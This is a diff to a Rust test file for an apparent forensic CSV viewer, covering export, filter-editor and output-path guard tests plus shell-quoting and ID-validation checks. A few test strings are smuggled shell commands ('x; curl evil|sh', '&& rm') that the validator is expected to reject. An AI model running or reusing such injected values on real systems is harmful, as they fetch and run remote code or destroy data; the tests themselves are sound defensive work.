@@ -94,11 +94,8 @@ fn open_filter_sort_tag_export_session() {
 
     // Export the view.
     let out = dir.path().join("out.csv");
-    let (rows, cols): (Vec<u32>, Vec<usize>) = {
-        let t = &h.state().tabs[0];
-        (t.view.iter().collect(), t.order.clone())
-    };
-    h.state_mut().tabs[0].start_export(out.clone(), rows, cols, fhv_engine::export::Format::Csv);
+    let cols = h.state().tabs[0].order.clone();
+    h.state_mut().tabs[0].start_export(out.clone(), false, cols, fhv_engine::export::Format::Csv);
     wait(&mut h, |a| a.tabs[0].job.is_none());
     let text = std::fs::read_to_string(&out).unwrap();
     assert_eq!(text.lines().count(), 3, "{text}");
@@ -141,7 +138,7 @@ fn windows_and_panes_render() {
     h.state_mut().help = true;
     h.run_steps(3);
     h.get_by_label("Row 4");
-    h.get_by_label_contains("Values (3)");
+    h.get_by_label_contains("Values (3,");
     h.get_by_label("Keyboard shortcuts");
     h.get_by_label("Show all");
 }
@@ -191,4 +188,71 @@ fn typing_in_search_and_filter_row() {
     h.get_by_label("filter User").type_text("jdoe");
     h.step();
     wait(&mut h, |a| idle(a) && a.tabs[0].view.len() == 250);
+}
+
+/// Review R-001 / R-002: the filter editor survives tab switches and being
+/// opened before the column index exists.
+#[test]
+fn filter_editor_tab_switch_and_early_open() {
+    let dir = tempfile::tempdir().unwrap();
+    let wide = sample(dir.path());
+    let narrow = dir.path().join("narrow.csv");
+    std::fs::write(&narrow, "a\n1\n2\n").unwrap();
+    let mut h = harness(dir.path(), &wide);
+    // Open the editor on the last column immediately (index not built yet).
+    h.state_mut().open_filter_editor(2);
+    h.run_steps(2);
+    wait(&mut h, idle);
+    h.run_steps(2);
+    h.get_by_label_contains("Values (");
+    // Another (narrower) file becomes active: the editor closes, no panic.
+    h.state_mut().open(&narrow);
+    h.run_steps(3);
+    wait(&mut h, |a| a.tabs.len() == 2 && a.tabs[1].ready());
+    h.run_steps(2);
+}
+
+#[test]
+fn guards_and_formatting() {
+    use crate::app::{
+        pretty_json_for_test as pj, refuse_target, shell_quote_for_test as sq,
+        valid_forhunt_id_for_test as vid,
+    };
+    let dir = tempfile::tempdir().unwrap();
+    let file = sample(dir.path());
+    let mut h = harness(dir.path(), &file);
+    wait(&mut h, idle);
+    let tabs = &h.state().tabs;
+    assert!(refuse_target(tabs, &file).is_some());
+    #[cfg(unix)]
+    {
+        let link = dir.path().join("link.csv");
+        std::os::unix::fs::symlink(&file, &link).unwrap();
+        assert!(refuse_target(tabs, &link).is_some(), "symlink to the input");
+        let hard = dir.path().join("hard.csv");
+        std::fs::hard_link(&file, &hard).unwrap();
+        assert!(
+            refuse_target(tabs, &hard).is_some(),
+            "hard link to the input"
+        );
+    }
+    let rel = dir.path().join("sub/../events.csv");
+    std::fs::create_dir_all(dir.path().join("sub")).unwrap();
+    assert!(
+        refuse_target(tabs, &rel).is_some(),
+        "relative path to the input"
+    );
+    assert!(refuse_target(tabs, &dir.path().join("other.csv")).is_none());
+    assert!(vid("4a2aa2ed:53413"));
+    assert!(!vid("x; curl evil|sh"));
+    assert!(!vid("4a2aa2ed:53413 && rm"));
+    assert_eq!(sq("/cases/a b/$(x)"), "'/cases/a b/$(x)'");
+    assert_eq!(sq("it's"), "'it'\\''s'");
+    assert_eq!(sq("/plain/path"), "/plain/path");
+    // Key order, duplicate keys and number spelling are kept.
+    assert_eq!(
+        pj(r#"{"b":1.10,"a":2,"a":[],"s":"x,y:{"}"#).unwrap(),
+        "{\n  \"b\": 1.10,\n  \"a\": 2,\n  \"a\": [],\n  \"s\": \"x,y:{\"\n}"
+    );
+    assert!(pj("{not json").is_none());
 }
